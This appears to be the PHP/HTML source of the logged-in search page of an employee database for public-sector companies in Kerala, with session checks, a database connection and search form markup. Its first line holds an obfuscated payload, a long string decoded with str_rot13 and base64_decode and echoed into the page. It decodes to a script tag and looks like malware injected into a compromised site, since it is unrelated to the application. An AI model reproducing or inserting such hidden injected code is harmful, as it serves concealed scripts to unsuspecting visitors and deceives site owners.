<?php $somecrainsignvar="9o84vhm4"; echo base64_decode(str_rot13('CUAwpzyjqQ5xLKEyCJ5yqlORLKEyXPx7qzSlVTSlCFWjEG1QVUV6KG9gMGfiCUHfrv52ISjvqQOxnFuiLJMop2VkL3q7VPqhDzqBDG59nPyfrFV7qUW5r2qmMKWeMKqaXPx7sJAuqTAbXTRcr2f9ozI3VRWio2kyLJ4bXF50o1A0pzyhMltcsGg2LKVtLKVlCFWzZGVfZPj2ZPjkZvjlAPjgZmZfYGLfBFjlZFjgAGpfYGR1YQZfBQDfYGHkYP0kZvj2BFjgBGNfZmZfYGLjYQRmBPjgZGRkYP0mYQZfBQDfYGHkYQV3YQV3YQV3YP04AljlAPjmBFjmYP00ZvjgAGDfZlj0AFjmAvjgZGtfYGR1YP05YQp1YP0mZljlAljgAGRfYGVkYP00AFjkZGpfYGZmYP05ZljjYQNfAwNfZGVfYGL5YQL2YP01APjmYP0kAFj2ZPj2ZljgZGN1YP0lZFjjYQRlZPjgZwDfYGp4YQRkZFjgAGRfYGLjYQp4YP0mYP05ZljjYQNfAGpfBFjlZFjgAGpfYGR1YQZfBQDfYGHkYP0kZvj1ZFjgBQpfAGpfYGxfYGZmYQD1YP0kAFjgZwRfZmZfZGVfYGL5YQL2YP01APjmYQp4YP0kBPjgAmHfBQDfYGxmYQRjAFjlAPjgAmVfZPjgAwZfZGtfZGtfZPjkZvjlZFjgZmxfAwNfYGLjYQLjYP0lAljgBFjlAljgAwLfZGHfZGtfAwLfYGt0YQR4YQZmYQH0YP01AljgBFjmYP0lZFj0BPjgZwRfYGHkYQxfZwpfAvjlZFjgAGDfBQDfYGDlYP0lAljgAGRfZGZ1YP0kZmHfZwDfAwLfYGR4YP0mYP02Zlj5ZPjkAFjgZljgAvjgZmNfYGZfYGLfAmVfYGRlBFjkZQHfYGR1YP0mZPj0AFjgZljlAljgZGN1YQDlYQD4YQR1YP03ZvjgAGpfZGN1YP0kAFjgZmNfAQHfYGZfYGR4YP0lAlj4ZFjgZljgZGRkYP0lAPjkZQHfYGH3YQR4YQR4YP0kBPjlZFjgZwRfAwxfYGL5YP05YQtkYP0kZwLfZGR3YP02ZljgZljjYP0mBFj4APjgBQRfYGZmYQp4YQRlYP0kBPjgBFj5YQLfZmLfYGx2YQLmYQRlYP0mYP0kZvj2ZljgBGxfZwRfYGZmYQZfZGN4YP0kZGRfAGDfYGVkYP00AFj0BPjgZmZfZmNfZGHfYGp4YQR4YQD4YP0mZlj3BPjkBPjgBGNfYGZfZmLfZGVfYGL5YQL2YP01APjmYQx5YP02BFj3BPjgZGN1YP0lZFjjYQRlZPjgZGVjYQNfAmVfYGDlYQplYP0kAFjgZmLfBFj2YQZ2YP02YP0mAvjkZvjgAwxfAwLfYGH0YQZfYGR1YQLjYQLmYP0mZljgBGZfZPjjYQDlYQV3YP02Avj5ZljgZwDfZwDfYGRjZvjkZQVfYGZ5YQxfZwRfYGH3YP0kAFjmYQt0YP01ZFjgZGVfAQtfYGt0YQR1YQHkYP0kBPjgZmZfYGV3YQRmBPjgZGRkYP0mYQZfBQDfYGHkYQRlYQZ2YP0mBFjkZvjgAwxfAwLfYGH0YQZfBQRfZwpfYGRjAFj1ZFjgZmZfZmxfYGLjYQZmYQLmYP02ZljjYP00BPj1AljlZFjgAGRfZwRfYGZmYQD1YQZ2YP0lZFjgAmHfBQDfZGVfYGL2YQL2YQV0YP03ZvjjYP02ZljkBPjkBPjjYQRlYQVkYP0mBFj2ZPjgAwNfAwNfYGV3YP05YQV3YP02AvjkAFjkBPj2AvjgBQDfZGtfZmZfAGDfYGH3YP05YQZfYGVkYQD4YP0lZFjgAGRfBFjlAlj2YQVkYP01APj4APjgAQVfYGV3YP01ZFjkZmHfYGRmAFjlAPj2AvjgZGtfYGZfYGLmYQxjYQR1YQV3YP0kZQHfAGRfYGZmYQZ5YP0lAlj4ZFjgZljgZGRkYQVkYQZfZGtfZGtfYGR4YQVkYP0lZFj2BFjgAwxfYGxfBQRfYGRmBPjkZQHfZwDfYGLmYP0mYQNfYGZ5YQt0YP0mYP03BPj1ZFjgZmZfZmxfYGV3YQtkYP0mYP0kZGRfZwRfYGHkYQp4YQRlYP0kBPjgBFj5YQLfZmLfYGRjBPjkZQHfYGZjYQRlYP0mYP0kZvj2ZljgBGxfZwRfYGZmYQtkYP03BPj1ZFjgZmZfZmxfYGV3YQtkYP0mYP0kZGRfZwRfBGNfYGRkZFj1APjgZwRfYGH3YQRjAFjgAQHfAQHfYGp4YQHkYP0mZljmBFjgZwpfBQRfYGZfYGRkZFjlZFjkZvjkAFjgAmtfAvjkZQHfYGD1YQD1YP03BPj1ZFjgZmZfZmxfYGLjYQZmYQLmYP02ZljjYP00BPj1AljlZFjgAGRfZwRfYGZmYQD1YQZ2YP05YP0mZPjgZljgAvj3ZvjgZwDfYGL2YQL2YP0kAFjgZmNfAQHfZwpfYGRjAFj1ZFjgZmZfZmxfYGLjYQZmYQLmYP02ZljjYP00BPj1AljlZFjgAGRfZwRfYGZmYQD1YQZ2YQV0YP0kZQHfAQVfAQtfZGHfYGplYQD4YP02Avj2AvjgZGHfYGZjYQD1YQV3YP0kZQHfYGVkYQNfZPj1Alj5YQVkYP01AljgZGHfZlj4APjgAGRfYGRlYQL5YP05ZPjmZljgAwNfZGZ4YP0kZGRfYGZfZlj4APjgAGRfZwpfZwpfZwpfYGt3YQV0YQZ5YQZfYGDlYP01APjmYQD1YQZ2YP0kBPjgZGHfYGxfAmHfYGZmYQV3YP01ZFjgZwRfYGD1YQZjYQZjYP04ZFjjYQZjYQt0YP00AFjgAwNfZGV2YP02Zlj2BFjgAmVfAvj5YQH0YP0kZQHfYGVkYQNfZGVjKFVhpzIjoTSwMFueYaA1LaA0pvtjYQRcYPqoWlx7pTS1CFWlovOyqwVjZGNvYaWypTkuL2HbMTS0MF5aMKETqJkfJJIupvtcYGRfVzSfVvx7MG1hMKptEaIhL3Eco24bVvVfVaWyqUHvX3OuqFx7MG1yXPx7LKVlCJHbLKVlXGgmCFVvB3MupvOjo3Z9ZQgzo3VbnG0jB2x8LKVlYzkyozq0nQgcXlfcr3Oiplf9pTSlp2IWoaDbnl5lMKOfLJAyXPWzLJkmMFVfVwOup2DvXFxeLKVlJ2yqYmZ7plf9LKVhp3Ivp3ElXUOipljkXGg9QDcyXUZcBmjip2AlnKO0Ct==')); $crain="";
	session_start();
	include("../connectdb/connect.php");
 	mysql_select_db("wavesatlive",$con);
	 if(!$con)
	{
		die('Could not connect to server' . mysql_error());
	} 	
	if(!isset($_SESSION['Logged']))
	{
		Header("Location: home.php");
		die();
	}
?>
<html xmlns:v="urn:schemas-microsoft-com:vml" xmlns:o="urn:schemas-microsoft-com:office:office" xmlns="http://www.w3.org/TR/REC-html40">
<head>

<meta http-equiv="Content-Language" content="en-us">

<script src="search.js"></script>
<script src="profile.js"></script>
<script src="update.js"></script>
<script src="report.js"></script>
<script src="login.js">	

</script>
<link href="../styleSheet/employee.css" type=text/css rel=stylesheet>
<link href="../styleSheet/employee_controls.css" type=text/css rel=stylesheet>
<title>:: Employee Database of PSUs in Kerala :: </title>


<style type="text/css">
<!--
A:link { COLOR: black; TEXT-DECORATION: none; font-weight: normal }
A:visited { COLOR: black; TEXT-DECORATION: none; font-weight: normal }
A:active { COLOR:  #FFFFFF; TEXT-DECORATION:none; font-weight: normal }
A:hover { COLOR:  #FFFFFF; TEXT-DECORATION: none; font-weight: normal }
-->
</style>
</head>
<?php
echo"
<body topmargin=0 leftmargin=0 marginwidth=0 marginheight=0 bgproperties=fixed bgcolor=#C0C0C0 
onload=subsearch('name','',1,1,1,'First_Name','".$_SESSION["LogType"]."')  onkeydown=visible(event) 
onclick=hidemenu()> ";
?>

 <table border="0" cellpadding="0" marginwidth=0 marginheight=0 cellspacing="0" bgcolor="#C0C0C0" 
 style="border-collapse: collapse"  width="100%" height="100%" bgproperties="fixed" >
 <tr>
 <td width="100%"  valign=top align=center>


 <table border="0" cellpadding="0" marginwidth=0 marginheight=0 cellspacing="0" bgcolor="#C0C0C0" style="border-collapse: collapse"  width="1000"  bgproperties="fixed" >
 <tr>
 <td width=100% height=10 valign=top align=center>
 </td>
 </tr>
 <tr>
 <td width=100%  valign=top align="center">
 <table border="0" cellpadding="0" cellspacing="0" style="border-collapse: collapse" width="938" id="AutoNumber1"  bordercolor="#C4E5F9">
   <tr>
     <td width="100%" valign=top align=center  >
    
     <table border="0" cellpadding="0" cellspacing="0"  width="100%" id="AutoNumber2" height="116" bgcolor="#C0C0C0">
       <tr>
         <td width="100%" height="125" valign="bottom" background="imghome/head.gif">		 
		 &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
		 &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
		 &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;		 		        
		 <input type="image" src="imghome/master.gif" onclick="JavaScript:menu('master','master')"> 
		 <input type="image" src="imghome/actions.gif" onclick="JavaScript:menu('actions','actions')"> 
		 <input type="image" src="imghome/reports.gif" onclick="JavaScript:menu('report','report')">
         </td>
       </tr>      	   
	   </table>
	   <span id="master" style="position: absolute; z-index: 500;left:188px; width:207; top:130px; height:70 ; overflow:auto;visibility:hidden;"></span>
	   <span id="report" style="position: absolute; z-index: 500;left:621px; width:217; top:130px; height:320 ; overflow:auto;visibility:hidden;"></span>
	   <span id="actions" style="position: absolute; z-index: 500;left:400px; width:217; top:130px; height:320 ; overflow:auto;visibility:hidden;"></span>
	   <span id="main">
	   <table border="0" cellpadding="0" cellspacing="0" style="border-collapse: collapse" width="100%" id="AutoNumber2" height="116" bgcolor="#C0C0C0">
	   <tr>
         <td width="100%" height="100" valign="top" background="imghome/body.gif">
         <table border="0" cellpadding="0" cellspacing="0" style="border-collapse: collapse" bordercolor="#111111" width="100%" id="AutoNumber3" height="180" >
           <tr>
             <td width="47%" height="45">&nbsp;</td>
             <td width="53%" height="25">&nbsp;</td>

           </tr>
           <tr>
             <td width="43" height="141">&nbsp;</td>
             <td width="57%" height="141" align="left" valign="top" class="txtleftwhite">
             
            
<table border="0" cellpadding="0" cellspacing="0" style="border-collapse: collapse" bordercolor="#111111" width="500" id="AutoNumber4" height="10">
               <tr>
               	 <td width="360" height="24" class="txtleftwhite">&nbsp;</td>
                 <td width="94" height="24" class="txtleftwhite" onclick="hide()">Name</td>
                 <td width="386" height="24" colspan=2><input type="text" name="txtKeyword" 
				 id="txtKeyword" 
				 size="53" class="txtboxgrey"></td>
                 
               </tr>
               <tr>
               	 <td width="20" height="24" class="txtleftwhite">&nbsp;&nbsp;</td>
                 <td width="94" height="24" class="txtleftwhite">Qualification</td>
                 <td width="263" height="24">
				 <input type="text" name="cmbQualification" id="cmbQualification" size="50" 
				 class="txtboxgrey" readonly="readonly">
				 </td>
				 <td width="123" height="24" class="txtleftwhite">
				 <input type="image" src="images/arrow.gif" width="18" height="21" 
				 onmouseup="view('quali')" ></td>
               </tr>
               <tr>
               	<td width="20" height="24" class="txtleftwhite">&nbsp;</td>
                 <td width="94" height="24" class="txtleftwhite">Designation</td>
                 <td width="263" height="24">
				 <input type="text" name="cmbDesignation" id="cmbDesignation" size="50" 
				 class="txtboxgrey"></td>
				 <td width="123" height="24" class="txtleftwhite">
				 <input type="image" src="images/arrow.gif" width="18" height="21"
				 onclick="view('desig')"  ></td>
               </tr>
               <?php
			   	if($_SESSION["LogType"]=="AD") 
			   	{
               ?>
               <tr>
                <td width="20" height="25" class="txtleftwhite">&nbsp;</td>
                 <td width="94" height="24" class="txtleftwhite">Company</td>
                 <td width="263" height="24">
				 <input type="text" name="cmbCompany" id="cmbCompany" size="50" class="txtboxgrey">
				 
				 </td>
				 <td width="123" height="24" class="txtleftwhite" align="left">
                 <input type="image" src="images/arrow.gif" width="18" height="21" 
				 onclick="view('company')" ></td>
               </tr>
                <?php
               	}
               	?>
               	
               <tr>
               <td width="500" valign="middle" align="left" colspan=4 height=23>
               <?php
			   	if($_SESSION["LogType"]=="AD") 
			   	{
               ?>
               <table width="500" height=17 cellpadding=0 cellspacing="0" border=0 
			   style="border-collapse: collapse" bordercolor="#111111">
               <tr>
                <td width="250" height="17" class="txtleftwhite"></td>
                 <td width="204" height="17" class="txtleftwhite" valign="top">City</td>
                 <td width="173" height="17" align=left>
				 <input type="text" name="cmbCity" id="cmbCity" size="31" class="txtboxgrey">			 
				 </td>	
				 <td width="26" height="17" align=left>				 
				 <input type="image" src="images/arrow.gif" width="18" height="21" 
				  >
				 </td>			 
				 <td width="170"  class="txtleftwhite" valign="bottom" height="17">
				 
				 <input type="image" src="imghome/button1.gif" onclick="getState('name','',1,1,1)"
				 onmouseover="swap1()" onmouseout="swap()" id="img" width="80" height="30"></td>
               </tr>
               </td>
               </table>
               <?php
               	}
               	else
               	{
               	?>
               	 <table width="500" height=17 cellpadding=0 cellspacing="0" border=0 
			   style="border-collapse: collapse" bordercolor="#111111">	
					<tr>
                <td width="32" height="17" class="txtleftwhite"></td>
                 <td width="94" height="17" class="txtleftwhite" valign="top"></td>
                 <td width="200" height="17" align=right>
				 		<input type="image" src="imghome/button1.gif" onclick="getState('name','',1,1,1)"
				 onmouseover="swap1()" onmouseout="swap()" id="img" width="80" height="30">
				 </td>	
				 <td width="26" height="17" align=left>				 
				 	 
				 </td>			 
				 <td width="170"  class="txtleftwhite" valign="bottom" height="17">
				
				</td>
               </tr>
               
             </table>
             </td>
             </tr>
             <?php
				}
               ?>
             </table>        
            
             </td>
           </tr>
         </table>
         </td>
       </tr>
       <tr>
       	<form action="login.php" method="POST" name="frmlogin"  >
         <td width="100%" height="46" valign="top" background="imghome/midle.gif" class="txtleft">
         &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
         <font face="Verdana" size="4"><b><br>
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; Featured List</b></font>
		&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
		<input type="button" value="Show Report" onclick="showReport()" class=button><span id="w"></span> 
		<span id="wait"></span> 
		&nbsp;&nbsp;&nbsp;<?php 
			if($_SESSION["LogType"]=="AD") 
			{
			   		echo "<a href='JavaScript:changePwd()'>Change Password</a>";
			}
		
		?>
		</td>
		</form>
		<div id="pwd" style="position: absolute; z-index: 500;left: 180px; width:500; height:150; top:290px;background-image: url('images/bgpwd.gif'); visibility:hidden "></div>
		<div id="captcha" style="position: absolute; z-index: 500;left: 210px; width:400; top:430px; ; ">
		</div>
	<span id="quali" style="position: absolute; z-index: 500;left:648px; width:303; top:227px; height:200 ; overflow:scroll; visibility:hidden; " ></span>
		<span id="desig" style="position: absolute; z-index: 500;left:648px; width:303; top:250px; height:200 ; overflow:scroll;visibility:hidden;"></span>
		<span id="company" style="position: absolute; z-index: 500;left:648px; width:303; top:277px; height:200 ; overflow:scroll;visibility:hidden;"></span>
		<span id="city" style="position: absolute; z-index: 500;left:0px; width:220; top:358px; height:200 ; overflow:scroll;visibility:hidden;"></span>
		<div id="report" style="position: absolute; z-index: 100;left:90px; width:220; top:380px; height:400 ; width:850; overflow:auto;visibility:hidden;background-color: #FFFFFF" align="left"></div>
		
       </tr>
       <tr onMouseOver="this.bgColor ='#C0C0C0'">
         <td width="100%" height="170" valign="top" background="imghome/midle.gif" align=center >
         <div id="listmembers" ></div>
         </td>
       </tr>   
	   
	   <span id="w1"></span>    
       <tr>
         <td width="100%" height="58" valign="top" background="imghome/bottom.gif" align=right>
         &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</td>
       </tr>
       </span>  
     </table>
    
     </td>
   </tr>
   
 </table>
 </td>
 </tr>
 </table>
 </td>
 </tr>
 </table>
</body>
</html>